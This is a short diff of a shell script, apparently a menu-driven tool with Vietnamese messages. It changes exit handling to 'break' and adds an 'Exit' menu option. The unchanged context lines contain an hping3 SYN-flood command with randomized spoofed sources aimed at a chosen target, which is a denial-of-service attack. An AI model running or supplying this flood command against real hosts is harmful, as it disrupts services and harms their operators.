@@ -23,7 +23,7 @@ do
                 hping3 -c 10000 -d 128 -S -w 64 -p 8000 --flood --rand-source $n
                 ;;
                 "Exit")
-                exit
+                        break
                 ;;
                 esac
                 done
@@ -50,7 +50,7 @@ fi
                         hping3 -c 10000 -d 128 -S -w 64 -p 8000 --flood --rand-source $n
                 ;;
                 "Exit")
-                exit
+                        break
                 ;;
                 esac
                 done
@@ -58,5 +58,10 @@ fi
                 echo Hệ điều hành của bạn không phải Ubuntu $REPLY
         exit
 fi
+      ;;
+        "Exit")
+        echo Thoát thành công
+        exit
+        ;;
 esac
 done
